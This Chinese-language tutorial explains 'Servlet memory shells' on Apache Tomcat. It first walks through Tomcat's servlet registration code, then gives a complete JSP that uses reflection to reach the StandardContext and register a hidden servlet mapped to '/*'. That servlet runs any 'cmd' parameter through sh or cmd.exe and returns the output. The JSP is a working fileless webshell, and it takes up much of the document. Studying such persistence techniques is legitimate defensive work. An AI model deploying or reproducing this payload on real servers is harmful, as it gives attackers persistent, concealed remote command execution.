# Servlet内存马

## 1.基础知识













## 2.原理分析

在上述代码中，定义了一个流程：

1. 通过 `webxml.getServlets()` 获取所有的 `Servlet` 定义,建立循环。

   ```java
   for (ServletDef servlet : webxml.getServlets().values()) {
   ...
   }
   ```

2. 创建 `Wrapper` 对象，设置 `Servlet` 的加载顺序、是否调用(获取 `</load-on-startup>` 值)、名称等基本属性。

   ```java
               Wrapper wrapper = context.createWrapper();
               if (servlet.getLoadOnStartup() != null) {
                   wrapper.setLoadOnStartup(servlet.getLoadOnStartup().intValue());
               }
               if (servlet.getEnabled() != null) {
                   wrapper.setEnabled(servlet.getEnabled().booleanValue());
               }
               wrapper.setName(servlet.getServletName());
   ```

3. 遍历 `Servlet` 的初始化参数设置到 `Wrapper` 中，并处理安全角色应用、将角色和对应链接添加到 `Wrapper` 中

   ```java
               Map<String,String> params = servlet.getParameterMap();
               for (Entry<String, String> entry : params.entrySet()) {
                   wrapper.addInitParameter(entry.getKey(), entry.getValue());
               }
               wrapper.setRunAs(servlet.getRunAs());
               Set<SecurityRoleRef> roleRefs = servlet.getSecurityRoleRefs();
               for (SecurityRoleRef roleRef : roleRefs) {
                   wrapper.addSecurityReference(
                           roleRef.getName(), roleRef.getLink());
               }
               wrapper.setServletClass(servlet.getServletClass());
   ```

4. 如果 `Servlet` 定义包含文件上传配置、则根据配置信息设置 `MultipartConfigElement`；设置 `Servlet` 是否支持异步操作； 

   ```java
   			 MultipartDef multipartdef = servlet.getMultipartDef();
               if (multipartdef != null) {
                   long maxFileSize = -1;
                   long maxRequestSize = -1;
                   int fileSizeThreshold = 0;
   
                   if(null != multipartdef.getMaxFileSize()) {
                       maxFileSize = Long.parseLong(multipartdef.getMaxFileSize());
                   }
                   if(null != multipartdef.getMaxRequestSize()) {
                       maxRequestSize = Long.parseLong(multipartdef.getMaxRequestSize());
                   }
                   if(null != multipartdef.getFileSizeThreshold()) {
                       fileSizeThreshold = Integer.parseInt(multipartdef.getFileSizeThreshold());
                   }
   
                   wrapper.setMultipartConfigElement(new MultipartConfigElement(
                           multipartdef.getLocation(),
                           maxFileSize,
                           maxRequestSize,
                           fileSizeThreshold));
               }
               if (servlet.getAsyncSupported() != null) {
                   wrapper.setAsyncSupported(
                           servlet.getAsyncSupported().booleanValue());
               }
               wrapper.setOverridable(servlet.isOverridable());
   ```

5. 通过 `context.addChild(wrapper);` 将配置好的 `Wrapper` 添加到 `Context` 中，完成 `Servlet` 初始化过程。

   ```java
     context.addChild(wrapper);
   ```

简单总结上述流程：

1. 创建 `Wrapper` 对象
2. 设置 `Wrapper`对象中`Servlet` 的 `LoadStartUp` 的值
3. 设置`Wrapper`对象中 `Servlet` 的名称
4. 设置`Wrapper`对象中 `Servlet` 的 `Class`
5. 将 `Wrapper` 添加到 `Context` 中
6. 将 `URL` 与自定义 `servlet` 类做关联映射

## 3.代码实现

```java
<%@ page import="java.lang.reflect.Field" %>
<%@ page import="org.apache.catalina.connector.Request" %>
<%@ page import="org.apache.catalina.core.StandardContext" %>
<%@ page import="java.io.IOException" %>
<%@ page import="java.io.InputStream" %>
<%@ page import="java.util.Scanner" %>
<%@ page import="org.apache.catalina.Wrapper" %>
<%

    Field requestField = request.getClass().getDeclaredField("request");
    requestField.setAccessible(true);
    Request request1 = (Request) requestField.get(request);
    StandardContext standardContext = (StandardContext) request1.getContext();

    HttpServlet servlet = new HttpServlet(){

        @Override
        protected void service(HttpServletRequest req, HttpServletResponse resp) throws ServletException, IOException {
            if (req.getParameter("cmd") != null){
                boolean isLinux = true;
                String os = System.getProperty("os.name");
                if (os != null && os.toLowerCase().contains("win")){
                    isLinux = false;
                }
                String[] exp = isLinux ? new String[]{"sh","-c",req.getParameter("cmd")} : new String[]{"cmd.exe","/c",req.getParameter("cmd")};
                InputStream inputStream = Runtime.getRuntime().exec(exp).getInputStream();
                Scanner s = new Scanner(inputStream).useDelimiter("\\A");
                String output = s.hasNext() ? s.next() : "";
                resp.getWriter().write(output);
                resp.getWriter().flush();
            }
        }
    };

    Wrapper wrapper = standardContext.createWrapper();
    wrapper.setName("MyServlet");
    wrapper.setLoadOnStartup(1);
    wrapper.setServlet(servlet);
    wrapper.setServletClass(HttpServlet.class.getName());

    standardContext.addChild(wrapper);
    standardContext.addServletMappingDecoded("/*","MyServlet");
    out.println("success...");
    out.flush();

%>
```

